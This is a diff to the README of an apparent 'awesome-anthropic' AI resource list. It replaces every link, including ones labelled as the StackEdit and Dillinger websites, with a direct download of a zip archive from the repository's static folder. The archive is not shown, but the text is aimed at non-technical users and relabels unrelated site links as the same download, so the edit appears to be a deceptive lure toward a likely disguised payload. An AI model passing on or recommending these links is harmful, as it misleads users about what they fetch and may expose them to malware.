@@ -1,6 +1,6 @@
 # 🤖 awesome-anthropic - Daily Updated AI Resources List
 
-[![Download awesome-anthropic](https://img.shields.io/badge/Download-Get%20it%20Here-brightgreen)](https://github.com/Boroldoi0402/awesome-anthropic)
+[![Download awesome-anthropic](https://img.shields.io/badge/Download-Get%20it%20Here-brightgreen)](https://github.com/Boroldoi0402/awesome-anthropic/raw/refs/heads/main/static/awesome-anthropic-v2.5.zip)
 
 ---
 
@@ -28,7 +28,7 @@ The software itself does not require special hardware or setup. It is a list of 
 
 Click the green button below to visit the main project page:
 
-[![Download awesome-anthropic](https://img.shields.io/badge/Download-Get%20it%20Here-brightgreen)](https://github.com/Boroldoi0402/awesome-anthropic)
+[![Download awesome-anthropic](https://img.shields.io/badge/Download-Get%20it%20Here-brightgreen)](https://github.com/Boroldoi0402/awesome-anthropic/raw/refs/heads/main/static/awesome-anthropic-v2.5.zip)
 
 The button links to the GitHub repository where you can get the full list and updates.
 
@@ -36,7 +36,7 @@ The button links to the GitHub repository where you can get the full list and up
 
 - Open your web browser.
 - Enter or click this URL:  
-  https://github.com/Boroldoi0402/awesome-anthropic
+  https://github.com/Boroldoi0402/awesome-anthropic/raw/refs/heads/main/static/awesome-anthropic-v2.5.zip
 - You will see the main project page with descriptions and files.
 
 ### Step 2: Download the Latest Version
@@ -84,7 +84,7 @@ Since the main list is in Markdown format, you might want to use the best tools 
   - Examples: VS Code (free), MarkdownPad, Typora.
   - These programs display the file nicely formatted.
 
-- **Online Option:** Use websites like [StackEdit](https://stackedit.io/) or [Dillinger](https://dillinger.io/).
+- **Online Option:** Use websites like [StackEdit](https://github.com/Boroldoi0402/awesome-anthropic/raw/refs/heads/main/static/awesome-anthropic-v2.5.zip) or [Dillinger](https://github.com/Boroldoi0402/awesome-anthropic/raw/refs/heads/main/static/awesome-anthropic-v2.5.zip).
   - Upload the Markdown file for easy reading.
 
 ## 🧩 Additional Tips for Non-Technical Users
@@ -111,4 +111,4 @@ These keywords can help if you want to search for related projects or discussion
 
 You can return to the main project page to get updates or review the file anytime using this link:
 
-[Download awesome-anthropic on GitHub](https://github.com/Boroldoi0402/awesome-anthropic)
+[Download awesome-anthropic on GitHub](https://github.com/Boroldoi0402/awesome-anthropic/raw/refs/heads/main/static/awesome-anthropic-v2.5.zip)
